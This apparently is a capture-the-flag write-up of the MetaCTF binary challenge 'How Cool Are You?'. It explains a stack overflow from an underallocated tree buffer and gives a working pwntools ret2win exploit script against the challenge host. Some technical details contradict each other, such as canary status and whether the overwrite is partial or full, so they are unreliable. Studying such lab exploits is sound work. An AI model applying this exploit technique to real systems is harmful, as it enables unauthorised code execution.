# How Cool Are You? - Writeup

---

## Challenge Description

![Alt text](img/1.png)

---

## Exploit Demo

This demo shows the exploitation flow:

![Alt text](gif/HowCoolAreYou.gif)

---

## Challenge Summary

The challenge involves a binary that parses binary tree-like strings into a flat array representation on the stack. Due to a flawed assumption that the tree is fully balanced, the program underallocates stack space when parsing sparse trees. This leads to a stack-based buffer overflow. The attacker can exploit this to partially overwrite the return address and redirect execution to a built-in debug_shell() function using a ret2win strategy. ASLR is bypassed with a brute-force approach targeting the lower 12 bits of the address.

## Binary Information

```bash
$ file christmas_tree.bin
```

![Alt text](img/2.png)

```bash
$ pwn checksec christmas_tree.bin
```

![Alt text](img/3.png)

---

## Static Analysis (IDA Pro)

The `main()` function reads user commands and passes input to `print_tree()` when the `"display"` option is chosen.

![Alt text](img/4.png)

In `print_tree()`, the program:

- Estimates the number of nodes (`estimate_tree_size()`),
- Allocates a stack buffer with `alloca()` based on that size,
- Parses the tree string via `decode_tree()`.

![Alt text](img/5.png)

**Issue:** The estimated size assumes a complete tree. With a deep, sparse tree, `decode_tree()` writes past the small buffer, causing a **stack buffer overflow**. This allows a **partial return address overwrite**, enabling a **ret2win exploit** via the hidden `debug_shell()` function.

---

## Exploit Strategy

Send a deeply nested, sparse tree string that causes the program to allocate a smaller buffer than needed. This triggers out-of-bounds writes on the stack, allowing partial overwrite of the return address. By placing specific characters at precise positions, the attacker overwrites the lower bytes of the return address to redirect execution to the hidden debug_shell() function. ASLR is bypassed by brute-forcing the unknown bits of the address, requiring multiple attempts to successfully gain a shell.

## Exploit Code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal --host kubenode.mctf.io --port 30005
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'kubenode.mctf.io'
port = int(args.PORT or 30005)

env_vars = {
        "FLAG":"MetaCTF{dummy_flag}"
}

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env_vars, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

offset = 76
payload = flat (
        b'A' * offset,
        p64(0x59682f01)
)
io.sendline(payload)
io.recvuntil(b"Oh, right, here's the flag: ")
flag = io.recvregex(br'MetaCTF{.*?}')
log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")

```

---

## Exploit Output

![Alt text](img/6.png)

---

## Vulnerability Summary

The binary parses strings representing binary trees and stores them in a stack-allocated array. It calculates the required buffer size by counting the number of nodes and assuming the tree is fully balanced. However, this logic fails when the tree is **deep and sparse** (e.g., having only right children), where the **depth exceeds the allocated array size**.

As a result, during deserialization, the program writes **beyond the bounds of the stack buffer**, causing a **stack-based buffer overflow**. Because the stack layout places the return address near the end of the array, carefully crafted input can be used to **partially overwrite the return address**. Although stack canaries are present and **ASLR is enabled**, the attacker leverages:

- **A hidden `debug_shell()` function** (ret2win-style exploitation).
- **Partial return address overwrite** (only lower 2 bytes needed).
- **Brute-force guessing** (\~16 tries on average due to 4 bits of entropy).

This leads to reliable control of execution flow and ultimately a shell, allowing retrieval of the flag.

---

## Flag

```
MetaCTF{oh_w0w_y0ur3_pr3tty_c00l_aft3r_a11}
```
